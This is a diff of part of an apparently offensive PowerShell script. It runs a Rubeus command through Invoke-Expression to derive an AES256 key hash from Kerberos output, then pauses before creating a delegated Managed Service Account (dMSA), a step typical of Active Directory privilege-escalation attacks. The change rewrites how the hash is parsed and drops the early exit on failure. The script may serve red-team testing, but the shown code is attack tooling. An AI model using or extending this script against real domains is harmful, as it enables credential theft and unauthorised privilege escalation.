@@ -36,13 +36,21 @@ Write-Host "[*] Running to derive AES256 hash:"
 Write-Host "    $hashCmd"
 $rubeusOutput = Invoke-Expression $hashCmd
 
-if ($rubeusOutput -match "AES256\s+:\s+([a-fA-F0-9]{64})") {
-    $AES256 = $Matches[1]
+# Parse AES256 hash
+$AES256 = $null
+foreach ($line in $rubeusOutput) {
+    if ($line -match "aes256_cts_hmac_sha1\s*:\s*([a-fA-F0-9]{64})") {
+        $AES256 = $matches[1]
+        break
+    }
+}
+
+if ($AES256) {
     Write-Host "[+] AES256 hash derived: $AES256"
 } else {
     Write-Error "[-] Failed to derive AES256 hash from Rubeus output."
-    return
 }
+
 Read-Host "Press ENTER to create dMSA..."
 
 ### 3. Create dMSA
